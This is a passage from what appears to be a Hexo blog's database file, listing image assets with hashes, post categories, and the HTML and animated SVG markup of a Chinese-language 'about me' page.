7db4ab0c72e605e1a4cb","modified":1494640355409},{"_id":"public/content/images/2016/08/1.jpg","hash":"beeee63d8da466d2570a3a2f339004aba0d9437f","modified":1494640355409},{"_id":"public/content/images/2016/08/IMG_0459.JPG","hash":"08e757ae34c82e1216dc7bf0c8f3de314f83194c","modified":1494640355410},{"_id":"public/content/images/2016/08/IMG_0635.PNG","hash":"f280a423c9de794fbbfa91d70fc634ab2c1dae63","modified":1494640355410},{"_id":"public/content/images/2016/08/stock-photo-mr-ployly-108366255.jpg","hash":"8b25f2ba44fde6ce111f8b124e4cda19bd84039b","modified":1494640355410},{"_id":"public/content/images/2016/08/stock-photo-mr-ployly-108366231.jpg","hash":"2ed6823e9ff75f773ae54a57dfacd6f95fb458e7","modified":1494640355410},{"_id":"public/content/images/2016/08/wallhaven-131694.jpg","hash":"d2e44a7374138acd010aa108e34f29193a904765","modified":1494640355410},{"_id":"public/content/images/2016/08/wallhaven-131694-1.jpg","hash":"d2e44a7374138acd010aa108e34f29193a904765","modified":1494640355410},{"_id":"public/content/images/2016/08/wallhaven-131694-2.jpg","hash":"d7169f37b2f336a5bcfbe4ced2ebb9fd66ef251a","modified":1494640355411},{"_id":"public/content/images/2016/08/wallhaven-392575-1.jpg","hash":"307459fe521206cd42016dbb89f0fe830cb33fbe","modified":1494640355411},{"_id":"public/content/images/2016/08/wallhaven-408428.jpg","hash":"1a10f789306272ea5acff4eacc69795986149862","modified":1494640355411},{"_id":"public/img/home-bg.jpg","hash":"a191201c3a98728e6ea66d6827df827ecfcc9d33","modified":1494640355431},{"_id":"public/content/images/f2e/about-me.jpg","hash":"db633afe5f3718e8eab578f71598376c02652361","modified":1494640355431},{"_id":"public/content/images/otr/2.jpg","hash":"00bd9b9bf9fdc2d3a0b8f9376168ce7f41b9d749","modified":1494640355432},{"_id":"public/content/images/githubauto/background.jpg","hash":"2e4df1ce474088afaf7cdb79b9937189a82fe517","modified":1494640355432},{"_id":"public/content/images/raspizero/1.png","hash":"d000ff30d52a4cbed46cea1bc383a9e0cf530661","modified":1494640355432},{"_id":"public/content/images/raspizero/2.png","hash":"f871c615380d678c9d18295d6fa3fcbf2d1810f5","modified":1494640355432},{"_id":"public/content/images/react/wall.png","hash":"ea23e2cc735746a7d82377b983e8d7bee1b02fb1","modified":1494640355432},{"_id":"public/content/images/torworld/1.png","hash":"00d7a05839002efe3f0e0c341387fc5099cdd77c","modified":1494640355433},{"_id":"public/content/images/torworld/4.png","hash":"5191c8cf4f08001562e17efc98509ed41eeaeb03","modified":1494640355433},{"_id":"public/content/images/torworld/3.png","hash":"37c0ccf7ab5044693dd5eeeac212f04486d89874","modified":1494640355433},{"_id":"public/content/images/torworld/7.png","hash":"f768712c3cbc8221ed57751d52758c5bae946de2","modified":1494640355433},{"_id":"public/content/images/zeronet/0.png","hash":"f53337f05bb498a83bdf67f1d8c061ddbed55144","modified":1494640355434},{"_id":"public/content/images/zeronet/4.jpg","hash":"d455dd41bd1cc4908f81d9ba3aa23b19f343ac05","modified":1494640355434},{"_id":"public/content/images/2016/08/DSC04069.JPG","hash":"61bbe63786ee24afe169ed6788647a13602360b5","modified":1494640355434},{"_id":"public/content/images/2016/08/DSC04069-1.JPG","hash":"61bbe63786ee24afe169ed6788647a13602360b5","modified":1494640355434},{"_id":"public/content/images/2016/08/DSC07326-3.JPG","hash":"dc6c3f61e627176c55eea5d1bcf3c20276120daa","modified":1494640355435},{"_id":"public/content/images/2016/08/GPIO.jpg","hash":"7c1d263b71671f8dc0ead71a4366f45a2a413e02","modified":1494640355435},{"_id":"public/content/images/2016/08/GPIO.png","hash":"a42a861d9e38e33ce1c530231b0667c921394aec","modified":1494640355435},{"_id":"public/content/images/2016/08/DSC07326-2.JPG","hash":"99637a5369978d220ea33921a463b84e370571e2","modified":1494640355436},{"_id":"public/content/images/2016/08/IMG_0502-1.JPG","hash":"c7e2a5cdc20221eaeb32832efbef29c5efed1784","modified":1494640355436},{"_id":"public/content/images/2016/08/IMG_0798.JPG","hash":"00461ad1c77528376da12b5e9c1d95424dcdb407","modified":1494640355437},{"_id":"public/content/images/2016/08/WechatIMG302.jpeg","hash":"df6490c06dd6fca9a2ad1fa41a7a0c894eaef532","modified":1494640355437},{"_id":"public/content/images/2016/08/WechatIMG293.jpeg","hash":"5825ef9bed7b65d92cae9cae817a9324fd2a8ad7","modified":1494640355438},{"_id":"public/content/images/2016/08/wallhaven-125158.jpg","hash":"e75940c9f9cc3bed82a534801f9ea255afed4fcb","modified":1494640355438},{"_id":"public/content/images/2016/08/wallhaven-291410-1.jpg","hash":"d154dc0b69388a582ef12e6ea5c538591fac25a4","modified":1494640355439},{"_id":"public/content/images/2016/08/wallhaven-291410.jpg","hash":"d154dc0b69388a582ef12e6ea5c538591fac25a4","modified":1494640355445},{"_id":"public/content/images/2016/08/wallhaven-392575.jpg","hash":"328a1c7e77d7aca0d058919c79d25c763e4f2e6e","modified":1494640355445},{"_id":"public/content/images/sqldocker/0.jpg","hash":"6d820311f4d6f2c76a2c110db64141683808b3ce","modified":1494640355466},{"_id":"public/content/images/torworld/12.png","hash":"db14c00acb0746120b6d27b1ac01c494069973ee","modified":1494640355466},{"_id":"public/content/images/torworld/5.png","hash":"9517102d7e63e80b848a01b682639e109946d480","modified":1494640355467},{"_id":"public/content/images/torworld/6.png","hash":"dbb624c16c634df1639f8f762d8f4fd2514c1586","modified":1494640355467},{"_id":"public/content/images/zeronet/6.jpg","hash":"8f1c6ff079ac0d6f82c89e252464334d3f062c96","modified":1494640355467},{"_id":"public/content/images/zeroweb/1.png","hash":"1e70aef095ad19961caca533759d7c415f0366be","modified":1494640355467},{"_id":"public/content/images/githubauto/awesomesnap.png","hash":"7ab3f6921fba01423167723733220a67d65934af","modified":1494640355467},{"_id":"public/content/images/2016/07/4-1.jpg","hash":"6fd7e626684c8abbd1a4f83f9186e149044cb7ab","modified":1494640355467},{"_id":"public/content/images/2016/08/DSC04031-1.JPG","hash":"e377908c1d88462310bf448824fd1ee55336bfa4","modified":1494640355468},{"_id":"public/content/images/2016/08/DSC07326-1.JPG","hash":"03a9248549b2f797154263c26238a9f3b523e29b","modified":1494640355468},{"_id":"public/content/images/2016/08/DSC04031.JPG","hash":"e377908c1d88462310bf448824fd1ee55336bfa4","modified":1494640355468},{"_id":"public/content/images/2016/08/DSC07326-4.JPG","hash":"065a2bb911e63f4766f69d9eba3525dabc5754e8","modified":1494640355468},{"_id":"public/content/images/2016/08/DSC07326-5.JPG","hash":"065a2bb911e63f4766f69d9eba3525dabc5754e8","modified":1494640355469},{"_id":"public/content/images/2016/08/DSC07326.JPG","hash":"03a9248549b2f797154263c26238a9f3b523e29b","modified":1494640355469},{"_id":"public/content/images/2016/08/IMG_0052.JPG","hash":"2d4d7697c2d3b8241d582e99ca7fd4182bb4fcf5","modified":1494640355469},{"_id":"public/content/images/2016/08/IMG_1131.JPG","hash":"adaaac127524b6f86118fd05258b3b530247a4bb","modified":1494640355469},{"_id":"public/content/images/2016/08/IMG_0912.JPG","hash":"1b9cb4ab2981d39cf66b4e05305af72cdeeb60f8","modified":1494640355469},{"_id":"public/content/images/2016/08/IMG_1133.JPG","hash":"08ca6b4eb0fbaf2540d48c619917b339f101a7e9","modified":1494640355470},{"_id":"public/content/images/2016/08/image.jpeg","hash":"c5b984715ee7f9616e954d097668db013a0ddf28","modified":1494640355470},{"_id":"public/content/images/2016/08/wallhaven-416679-1.jpg","hash":"9166c465a0547b9f7edd93f365f854260d2a46e5","modified":1494640355471},{"_id":"public/content/images/2016/08/wallhaven-94129-1.jpg","hash":"744f58d22879482941f9271fef31385b2568f012","modified":1494640355471},{"_id":"public/content/images/2016/08/wall.jpg","hash":"17264ad2b5f96b3fa4bb2eed54b86a79824c47a5","modified":1494640355471},{"_id":"public/img/1home-bg.jpg","hash":"b936128879cfb0103f62915b1bcd123fda5199dc","modified":1494640355492},{"_id":"public/content/images/badusb/preview.gif","hash":"cd6850cbcacf2e656b30ec7d848caeb341079f1a","modified":1494640355492},{"_id":"public/content/images/sqldocker/3.jpg","hash":"67d8eeff573c65e74b11700dc92f6462e87b5bd0","modified":1494640355492},{"_id":"public/content/images/wechat/1.jpg","hash":"bc9a095a259c83cbfe8cae4c965248345dd5858c","modified":1494640355493},{"_id":"public/content/images/wat/2.png","hash":"af180a9d017aa59124b06370c25799fb4d8dd46e","modified":1494640355494},{"_id":"public/content/images/wechat/3.jpg","hash":"2862ffbdab93a35734597ea7e1c0fcd0cf4c653b","modified":1494640355495},{"_id":"public/content/images/2016/07/1-1.jpg","hash":"7e4b4312437dd2a2e2c299d3079eac25397195b3","modified":1494640355495},{"_id":"public/content/images/2016/07/1-2.jpg","hash":"7e4b4312437dd2a2e2c299d3079eac25397195b3","modified":1494640355496},{"_id":"public/content/images/2016/08/IMG_0310-1.JPG","hash":"f39c5bb41935fe911e4cc96f94fe56df45d96df0","modified":1494640355496},{"_id":"public/img/home-3bg.jpg","hash":"90239ce4b61c85151aba4c5a2a1504415cea2620","modified":1494640355522},{"_id":"public/img/home-b3g.jpg","hash":"4beaae66ac6bf3c4f0acc32f2052fb927d695c7f","modified":1494640355522},{"_id":"public/content/images/githubauto/1.jpg","hash":"4d18c817cc027a9ceb81e6318cdde9747b9e49cb","modified":1494640355525},{"_id":"public/content/images/poisontap/3.png","hash":"d668f89b3a59270362522006635deefe4e5edb65","modified":1494640355525},{"_id":"public/content/images/github/1version.jpg","hash":"27e19cc3985f0e5774b76691ae68c94eec41469c","modified":1494640355525},{"_id":"public/content/images/sqldocker/1.jpg","hash":"3b8c164d0c81ef8516bd9e84f71ffaaa2ffaa7c9","modified":1494640355526},{"_id":"public/content/images/torworld/13.png","hash":"19ee10a250dacacabc1adaf31cdcb106ff953cbe","modified":1494640355526},{"_id":"public/content/images/torworld/2.png","hash":"ecbaef486d0c265c35591d990076b757359fccd6","modified":1494640355527},{"_id":"public/content/images/2016/08/WechatIMG10.jpeg","hash":"8848406df7412ace37288f20e02d7570e8ac7b3a","modified":1494640355527},{"_id":"public/content/images/2016/07/2.jpg","hash":"c5dc6807dc66bace55dd230c7345d8c7f9e18c09","modified":1494640355528},{"_id":"public/content/images/2016/08/wallhaven-416679.jpg","hash":"bf71d3cc94b24efcdcb35d4369db63514d3bb86c","modified":1494640355528},{"_id":"public/content/images/2016/08/wallhaven-94129-2.jpg","hash":"fe749ae41441bedc997c8d65cdbcc253fdbda30b","modified":1494640355529},{"_id":"public/content/images/2016/08/wallhaven-94129.jpg","hash":"03d0ce91743f5b67353f2099a686a5ec0918589d","modified":1494640355529},{"_id":"public/content/images/torworld/10.png","hash":"6f746fefa14da17f17c64cfe4e53d6b5f3b9be75","modified":1494640355530},{"_id":"public/content/images/torworld/11.png","hash":"d7957e62f2b401955e5909cde94dfc0bf27d7c9e","modified":1494640355577},{"_id":"public/content/images/2016/07/1.jpg","hash":"c84cf78cb9f80cfb80889876341aed8fa2f4b80c","modified":1494640355577},{"_id":"public/content/images/2016/07/5-pic_hd.jpg","hash":"9a745fd70c96cb40743712158525c3e53933e374","modified":1494640355578},{"_id":"public/content/images/torworld/9.png","hash":"c6ca38788a52d6d783dbb488dbd94a6e47ec3a08","modified":1494640355579},{"_id":"public/img/home-bg1.jpg","hash":"e6d2451506e6c884847ea86646fdeb96575fab08","modified":1494640355597},{"_id":"public/content/images/sqldocker/2.jpg","hash":"99cf9146ddad02dad17ebe4df6864f652666e208","modified":1494640355597},{"_id":"public/content/images/torworld/8.png","hash":"9b25a42978d17fb77d6b77d49ab2645881471d0a","modified":1494640355597},{"_id":"public/content/images/2016/07/2-1.png","hash":"6897845f3e8afbf1f7dfa342de852d427d6f83a2","modified":1494640355598},{"_id":"public/content/images/poisontap/5.png","hash":"874dc7725601c2b6e0d660cc57ded6e5dbc28816","modified":1494640355614},{"_id":"public/content/images/raspizero/mail.jpg","hash":"3cd13bed4b3449459f756423c13d3435bcaa5b96","modified":1494640355614},{"_id":"public/content/images/wechat/2.jpg","hash":"f9eeef6ff4792961fb23fb40eb31f64f1345d473","modified":1494640355617},{"_id":"public/content/images/2016/07/8-pic_hd.jpg","hash":"d17c7cc223c2d1254d4a737a8244f7d5bd148594","modified":1494640355671},{"_id":"public/content/images/2016/07/stock-photo-132346157-1.jpg","hash":"3f7b35da05274615e9c43dc00c5f45978b4b82ad","modified":1494640355694},{"_id":"public/content/images/2016/07/6-pic_hd.jpg","hash":"a8ff095c62e6cd2e57a91ec881ec4d25b863b37b","modified":1494640355694},{"_id":"public/content/images/2016/07/stock-photo-132346157.jpg","hash":"3f7b35da05274615e9c43dc00c5f45978b4b82ad","modified":1494640355695},{"_id":"public/content/images/2016/07/7-pic_hd.jpg","hash":"59414eb00217b9ab287c2b22e99a4b421473b641","modified":1494640355705},{"_id":"public/content/images/poisontap/4.png","hash":"fd48fef3728ba776fe49e30f4b83f46f00804ac6","modified":1494640355709},{"_id":"public/content/images/badusb/2.jpg","hash":"a08b71762cfb6a23d94be0438b4cf67a918f630b","modified":1494640355709},{"_id":"public/content/images/2016/07/1-pic_hd.jpg","hash":"99aed5231a97f5dec6f2e9ce021093a1526c54d3","modified":1494640355710},{"_id":"public/content/images/2016/07/9-pic_hd.jpg","hash":"ffcfed03a9232be2eec3b3ef04f05d8ab3c0e5d7","modified":1494640355721},{"_id":"public/content/images/otr/3.jpg","hash":"143efe93d9323483606f36aefa88975456a55fcd","modified":1494640355721},{"_id":"public/content/images/2016/07/QQ20160729-0-2x.png","hash":"87a86e333dd0cf0fc443c26a951d4f81ef94a2bf","modified":1494640355731},{"_id":"public/content/images/2016/07/3-pic_hd.jpg","hash":"a5b7063f85f03cfe7ad2415839f6bf983aed1aa6","modified":1494640355740},{"_id":"public/demo.png","hash":"bdd1c84dbf69b1e999a60f806485ffbc32a1178e","modified":1494640355744},{"_id":"public/content/images/poisontap/2.gif","hash":"4c7efea2816b6e93bab93bad2bc67a3de55afcc4","modified":1494640355756},{"_id":"public/content/images/zeronet/8.png","hash":"8f0c2523571859520dfd11d3ccfcc883e61dbe77","modified":1494640355768},{"_id":"public/content/images/2016/08/IMG_0502.JPG","hash":"053255b8b2c97a07a3c878f2199708f18606c34d","modified":1494640355772},{"_id":"public/content/images/poisontap/1.gif","hash":"be4058ac081ed1060438ee84444ddd9c246c1f7c","modified":1494640355774},{"_id":"public/content/images/2016/08/IMG_0310.JPG","hash":"5a2c3d2ca47eee4b080c2622791c0a34d9e3962e","modified":1494640355779},{"_id":"public/content/images/raspizero/3.png","hash":"ad4694331d2c83e70d79db77de0c484a88746369","modified":1494640355793},{"_id":"public/content/images/2016/07/05b2ca554a02c900000115a8e67804.jpg","hash":"44abc290aa6bf5dbb36d96e5f2472228b9d70766","modified":1494640355798},{"_id":"public/content/images/2016/07/05b2ca554a02c900000115a8e67804-1.jpg","hash":"44abc290aa6bf5dbb36d96e5f2472228b9d70766","modified":1494640355798},{"_id":"public/content/images/2016/07/----.jpg","hash":"fef2e98d8cefbc85f60db377b3a7bd805716f805","modified":1494640355816}],"Category":[{"name":"Hack","_id":"cj2mm9xnh00065es5r697fi22"},{"name":"心情","_id":"cj2mm9xnq000d5es5d5ma5ov1"},{"name":"Docker","_id":"cj2mm9xo0000p5es5h4026xxj"},{"name":"Web","_id":"cj2mm9xo4000v5es5fht6cr5g"},{"name":"Github","_id":"cj2mm9xod00195es5052rl3wq"},{"name":"github","_id":"cj2mm9xoi001i5es5z9f1brci"},{"name":"Ops","_id":"cj2mm9xom001p5es5oazd1bqe"},{"name":"Mac","_id":"cj2mm9xop001x5es5i02ax80h"},{"name":"Rasberry","_id":"cj2mm9xor00265es58irtc2ar"},{"name":"Raspberry","_id":"cj2mm9xow002e5es5670ebwul"},{"name":"Sql","_id":"cj2mm9xoz002m5es5zwuy8cwm"},{"name":"笑话","_id":"cj2mm9xp3002v5es5ven2rlr1"},{"name":"CodeStyle","_id":"cj2mm9xp500355es5u9endv9t"},{"name":"Linux","_id":"cj2mm9xpl003z5es5iwg38wzm"}],"Data":[],"Page":[{"layout":"false","_content":"<!doctype html>\n<html lang=\"\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />\n    <title>关于我</title>\n\n    <!-- build:css styles/main.css -->\n    <link rel=\"stylesheet\" href=\"styles/main.css\">\n    <!-- endbuild -->\n\n  </head>\n  <body>\n    <div class=\"container\">\n      <div class=\"content\">\n        <canvas id=\"universe\"></canvas>\n        <canvas id=\"canvas\"></canvas>\n        <div id=\"footer\" class=\"\">\n          <svg id=\"scene\" x=\"0px\" y=\"0px\" width=\"1600px\" height=\"315px\">\n              <path id=\"ground\" d=\"M0,316.4209c0,0,157.7119-35.416,469-56c7.3833-0.4883,23.7876-3.5488,31.3335-4.0166\n            c3.7681-0.2334,19.4302,0.9424,28.3335,0.3506c17.1494-1.1396,30.9072-4.2734,38.333-4.6836\n            c7.5972-0.4189,18.4058,0.3799,27.6665-0.9834c5.7075-0.8408,10.1318-4.042,14.9248-4.2705\n            c7.8369-0.373,24.5693,3.6084,34.4087,4.2705c11.0586,0.7432,15.2656-1.8135,24.3335-2.1523c10.0576-0.376,20.4629,1.3867,28.6665,0\n            c3.5957-0.6074,4.4194,0.4209,7.7227-0.7715c1.4927-0.5391,5.8179-3.5693,6.9438-4.2432c3.8335,0.667,6.1426-1.0732,9.917-1.167\n            c2.2739-0.0566,3.9673-0.9072,6.249-0.9609c2.2725-0.0537,5.5547-1.2383,7.8345-1.2881c2.25-0.0498,3.498,1.0352,5.7554,0.9883\n            c2.9648-0.0615,7.9341,0.3164,10.9111,0.2607c2.2461-0.042,2.4976-0.5195,4.7505-0.5586c2.9663-0.0518,2.1045-0.5615,5.0825-0.6074\n            c1.5811-0.0244,6.9976,0.4131,8.582,0.3896c0.8887-0.0127,2.6113,0.373,3.5015,0.3604c1.5527-0.0215,2.2739-0.4404,3.8296-0.4609\n            c1.416-0.0186,2.0854-0.8555,3.5039-0.873c1.0835-0.0127,2.9155,0.7939,4.0005,0.7813c1.1104-0.0127,3.5542,0.4805,4.666,0.4688\n            c1.3047-0.0137,1.2773-0.5332,2.584-0.5459c1.415-0.0137,1.165-0.4414,2.5825-0.4541c0.916-0.0078,3.499,0.3984,4.416,0.3906\n            c1.499-0.0127,1.833,0.6221,3.3345,0.6104c1.3296-0.0098,3.8267-0.666,5.1587-0.6748c1.3335-0.0088,2.8389-0.6514,4.1743-0.6592\n            c1.3335-0.0078,2.4971,0.6191,3.8325,0.6123c2.5518-0.0127,7.3579,0.3965,9.9175,0.3877c5.3169-0.0176,5.5796-0.4063,10.9297-0.4063\n            c1.8379,0,6.7031,1.3184,8.3203,1.2402c2.1055-0.1016,3.7139-1.6572,5.5283-1.7969c3.9541-0.3037,7.3262-0.5732,10.5986-0.2598\n            c6.248,0.5977,12.1973-0.8125,21.207-0.7539c1.7266,0.0107,15.7813,3.085,17.5,3.0977c3.4014,0.0254,6.6191-1.3398,9.9971-1.3066\n            c4.1221,0.041,8.2275,1.2529,12.3369,1.3066c2.0752,0.0273,4.1543-1.1084,6.2314-1.0771c3.3662,0.0498,4.5547,1.0166,7.9346,1.0771\n            c2.1104,0.0381,6.4063-0.834,8.5264-0.792c2.7021,0.0537,4.4766-1.6729,7.2002-1.6113c2.9277,0.0654,7.6465,3.1641,10.6074,3.2393\n            c4.8359,0.123,8.8809-0.9854,13.832-0.8359c2.5029,0.0752,11.8818,2.0498,14.375,2.1289c1.8398,0.0586,2.499-1.2188,4.334-1.1582\n            c2.1689,0.0713,4.5049,1.209,6.666,1.2832c2.6699,0.0908,4.3398-0.916,6.998-0.8203c3.3379,0.1201,6.0566,1.3193,9.377,1.4453\n            c4.001,0.1514,4.7764-1.1602,8.75-1c3.1836,0.1289,16.834,1.9912,20,2.125c4.0059,0.1699,4.0029-0.9004,7.9814-0.7227\n            c6.8594,0.3076,7.9102,1.7656,14.6855,2.0977c8.916,0.4365,23.5254-0.2432,32.293,0.2344\n            c6.7168,0.3662,13.3896,0.7432,20.0186,1.1318C1458.8545,268.4941,1680,316.4209,1680,316.4209H0z\" />\n              <path id=\"stone1\" d=\"M680.3335,250.7549c7.3335,0.333,13.6665-1.2549,6-6.4609s-14.333-7.1221-18.6665,0.8359\n            S680.3335,250.7549,680.3335,250.7549z\" />\n              <path id=\"stone2\" d=\"M750.5,243.1709c3.25,0,2.5-3.707-1.75-4.2285s-5,3.7285-3,4.2285S750.5,243.1709,750.5,243.1709z\" />\n              <path id=\"stone3\" d=\"M988.4893,243.8242c2.8857,0.3467,4.8438,1.2627,3.0107-2.0703s-7.3955,1.3555-5.2031,1.7129\n            S988.4893,243.8242,988.4893,243.8242z\" />\n              <path id=\"stone4\" d=\"M697,248.9355c2.0142-0.2021,2.1665-2.0156,1-2.1816s-9.1543,1.8398-5.9937,2.6699S697,248.9355,697,248.9355z\" />\n              <g id=\"greens\" transform=\"translate(850, 180)\">\n                  <g>\n                      <path d=\"M36.3877,59.4268C33.0576,18.9482,6.4658,4.522,6.4658,4.522s22.4834,16.1426,24.4414,54.2251\n    C32.8657,96.8311,36.3877,59.4268,36.3877,59.4268z\" />\n                      <path d=\"M41.8496,83.1641C31.1572,43.98,2.3711,34.6738,2.3711,34.6738s25.063,11.7471,33.9668,48.8271\n    C45.2441,120.5791,41.8496,83.1641,41.8496,83.1641z\" />\n                      <path d=\"M31.3955,60.7207C23.7139,25.7979,2.5381,16.9541,2.5381,16.9541s18.4165,10.9277,24.7925,43.9502\n    C33.7061,93.9258,31.3955,60.7207,31.3955,60.7207z\" />\n                      <path d=\"M40.4517,62.0068C47.9473,21.6187,25.4009,0.1914,25.4009,0.1914s18.0098,21.9634,9.7896,59.6357\n    C26.9722,97.499,40.4517,62.0068,40.4517,62.0068z\" />\n                      <path d=\"M41.9414,69.4316c13.0313-38.9565-6.3218-63.3062-6.3218-63.3062s14.7856,24.251,1.4141,60.4185\n    C23.6621,102.709,41.9414,69.4316,41.9414,69.4316z\" />\n                      <path d=\"M29.4976,87.9092c27.4097-30.5938,19.2993-60.6226,19.2993-60.6226s3.958,28.1255-22.6606,56.0249\n    C-0.4775,111.2109,29.4976,87.9092,29.4976,87.9092z\" />\n                      <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;10;0\" begin=\"0s\" dur=\"5.5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      <animateMotion type=\"translate\" values=\"0,0;-10,0;0,0\" begin=\"0s\" dur=\"5.5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                  </g>\n                  <g>\n                      <path d=\"M34.9995,60.4189C56.0713,30.6665,46.1133,5.4014,46.1133,5.4014S52.2559,29.4746,31.6235,56.79\n    C10.9917,84.1035,34.9995,60.4189,34.9995,60.4189z\" />\n                      <path d=\"M36.3047,64.5391c28.4629-23.4443,25.3262-51.189,25.3262-51.189s-0.293,25.4971-27.6851,46.6538\n    C6.5552,81.1631,36.3047,64.5391,36.3047,64.5391z\" />\n                      <path d=\"M33.0449,70.502c31.4424-19.2637,32.1875-47.1748,32.1875-47.1748s-3.8291,25.208-33.897,42.3584\n    C1.271,82.833,33.0449,70.502,33.0449,70.502z\" />\n                      <path d=\"M13.8237,76.0244c36.5039-5.2158,48.2563-30.543,48.2563-30.543S48.5693,67.1045,14.168,70.9248\n    C-20.2324,74.749,13.8237,76.0244,13.8237,76.0244z\" />\n                      <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;15;0\" begin=\"0s\" dur=\"5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      <animateMotion type=\"translate\" values=\"0,0;-15,0;0,0\" begin=\"0s\" dur=\"5s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                  </g>\n              </g>\n              <g id=\"sign\" transform=\"translate(700, 180)\">\n                  <polygon points=\"21.2168,1.1143 20.6665,1.5459 19.7593,1.4473 19.229,1.4209 18.9707,1.6274 18.6665,1.9004 17.6865,1.9219\n    37.3516,87.8877 40.8828,87.0791   \" />\n                  <polygon points=\"45.4111,9.5537 2.4258,18.7158 1.563,18.498 1.4585,17.2114 0.8291,15.583 0.9165,14.3364 0.0908,12.6548\n    0.2085,12.0864 -0.1924,11.5308 -0.3296,9.271 43.3408,-0.0376 43.4766,0.5015 43.334,0.9629 43.6533,1.2046 43.8232,1.8784\n    43.8965,2.7754 44.2217,3.459 44.625,5.0576 45.041,7.5459 45.2637,7.5962 45.6191,9.0073  \" />\n                  <polygon points=\"47.0078,20.8545 4.2368,29.5503 3.5933,28.5903 3.3965,26.9746 2.4683,24.5137 2.8398,24.1372 2.2676,23.7847\n    1.9834,22.7563 2.2417,22.3394 1.7388,21.8706 1.2627,20.1426 44.8281,11.2852 45.082,12.4014 45.0723,12.9517 45.3281,13.481\n    45.752,15.3369 46.0273,17.7524 46.4219,18.2803  \" />\n                  <polygon points=\"47.666,31.168 4.7803,39.4023 4.251,37.4004 4.4429,36.1895 3.6465,35.1123 3.0142,32.7178 3.2754,32.1025\n    2.7461,31.7046 2.2676,29.8945 45.9268,21.5107 46.0762,22.2007 45.9512,22.8423 46.2783,23.1372 46.6777,24.9795 46.5234,25.4795\n    47.3027,27.8667 47.8086,30.2017   \" />\n              </g>\n              <g id=\"boy_1_\">\n                  <g id=\"boy\">\n                      <path d=\"M800.7324,167.6929c0,0-7.9688-6.5039-9.7197-8.041c-1.751-1.5366-7.9331-6.5039-8.7197-13.0435\n    c-0.7861-6.5396,6.0752-15.188,17.7969-16.1885c11.7207-1.0005,12.9727,1.0366,14.1514,2.7163\n    c1.1787,1.6792,5.7178,11.1494,5.0752,18.6538c-0.6445,7.5049-5.6826,10.1133-9.7559,13.3652\n    C805.4863,168.4072,800.7324,167.6929,800.7324,167.6929z\" />\n                      <path d=\"M810.7031,169.2109c-1.0723-1.3037-1.3574-2.9556-1.1426-4.0645c0.2139-1.1084-8.041,0.1128-8.8281,2.542\n    c1.6445,1.6787,0.751,3.146-0.5,4.1108c-1.25,0.9648-1.6797,1.502-1.9297,1.8237c0.0361,0.5361,0,0.9653,0,0.9653\n    s-1.4297,1.7153-2.2871,6.5396s-0.6787,6.79-0.9648,8.3267c-0.2852,1.5366-1.4648,5.9678-1.751,10.292s0,4.5742,0,4.5742\n    s1.251,1.7153,1.1436,4.0742s-1.2705,5.6099-1.2705,5.6099s0.2344,1.8945,1.8779,2.252c1.6445,0.3574,2.3594-0.6436,2.3594-0.6436\n    s1.0713,1.3223,1.75,4.0742c0.6797,2.752,0.6436,6.79,1.8945,7.9688c1.251,1.1797,1.6074,0.3223,1.6074,0.3223\n    s0.4648,3.3975-0.9277,6.6855c-1.3945,3.2881-4.1465,6.7568-4.1465,6.7568h11.0781c0,0,1.5723-3.5234-7.1113-2.2363\n    c3.252-4.0742,3.8955-6.1934,4.0391-11.125c1.8223,0.5,4.252,0.6738,4.9316-0.3271c0.5352,1.3223,2.4297,2.1787,3.3584,1.7139\n    c-0.2139,3.7168-1.0713,12.1846-1.0713,12.1846l9.0049,0.2852c0,0-0.751-3.2168-6.29-1.4307\n    c1.001-6.7891,1.3584-11.5068,1.3584-11.5068s1.3584,0.1074,1.8584-0.3926c0.5-0.501,0.6787-5.3252-0.4648-9.9346\n    c-1.1436-4.6104-0.5-4.4678-0.5-4.4678s1.75-0.8213,1.5-2.8584s-0.8574-3.6807-1.5352-5.5391\n    c0.4639-0.1074,1-0.7861-0.6797-2.7158c-0.2148-2.5015-0.9648-6.3242-0.6436-7.6465s0.2148-2.8232-0.1787-4.3599\n    c0-2.4302,0.7148-13.1509-1.25-17.0103c-1.9658-3.8594-2.5371-3.5737-2.5371-3.5737S812.5977,169.0142,810.7031,169.2109z\" />\n                  </g>\n                  <g transform=\"translate(783, 122)\">\n                      <g>\n                          <path d=\"M35.3506,17.9644c2.9834-3.71,5.9824-15.2095-3.1846-18.3765c2.668,3.833,1.168,5.6665,1.168,5.6665\n    S32,1.2549,28.666-0.4121c1.5,3.1665,0,5,0,5S20.5,8.9209,24.5,13.2544S35.3506,17.9644,35.3506,17.9644z\" />\n                          <animateTransform attributeName=\"transform\" type=\"skewX\" values=\"0;30;0\" begin=\"0s\" dur=\"4s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                          <animateMotion type=\"translate\" values=\"0,0;-10,0;0,0\" begin=\"0s\" dur=\"4s\" fill=\"freeze\" repeatCount=\"indefinite\" />\n                      </g>\n                      <g>\n                          <path d=\"M27.125,6.2334c-1.8125-0.625-2.0625-1.9375-4.375-2.25c1,0.8125,1.125,1.6875,1.125,1.6875S21.5,4.3584,19.0625,3.9834\n    c1.3125,0.75,2,1.875,2,1.875s-3.25-0.75-5.875-0.75c1.125,0.3125,1.125,0.6875,1.125,0.6875S10.75,5.8584,8.6875,7.4834\n    c1,0.125,0.9375,0.6714,0.9375,0.6714s-4.25,1.5786-5.375,3.7661c0.875-0.4375-0.8125,1.8125-0.8125,1.8125s0.75,1.375-0.3125,1.125\n    S0.5,14.1084,0.5,12.5459c-0.5,2.1875,0.6924,2.5767,1.4375,3.3125c-0.0625,1-0.9375,2.6494-1.25,2.106s0.8594,0.4282,0.0547,2.4731\n    c-0.8047,2.0459-1.1533,3.7432-0.5103,6.5195s2.7056,4.5264,3.5181,6.2139s0.5-1.6875,0.5-1.6875L27.125,6.2334z\" />\n                      </g>\n                  </g>\n              </g>\n          </svg>\n        </div>\n      </div>\n    </div>\n    <!-- build:js scripts/main.js -->\n    <script src=\"scripts/universe.js\"></script>\n    <script src=\"scripts/main.js\"></script>\n    <!-- endbuild -->\n    <script>\n    